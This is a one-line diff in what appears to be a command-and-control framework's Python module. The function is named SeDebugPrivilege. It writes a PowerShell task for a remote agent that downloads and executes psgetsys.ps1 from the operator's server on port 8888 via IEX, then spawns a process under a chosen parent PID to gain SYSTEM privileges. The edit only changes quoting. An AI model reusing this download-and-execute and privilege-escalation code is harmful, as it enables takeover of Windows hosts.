@@ -695,7 +695,7 @@ def SeDebugPrivilege(request):
             f.write(exep)
             f.close
 
-        task= 'IEX(New-Object Net.WebClient).DownloadString(\'http://{}:8888/psgetsys.ps1\');[MyProcess]::CreateProcessFromParent({},\'{}\',"")'.format(ip,pid,path_to_execute)
+        task= 'IEX(New-Object Net.WebClient).DownloadString(\'http://{}:8888/psgetsys.ps1\');[MyProcess]::CreateProcessFromParent({},\'{}\',\'\')'.format(ip,pid,path_to_execute)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "a") as f:
             f.write(task)
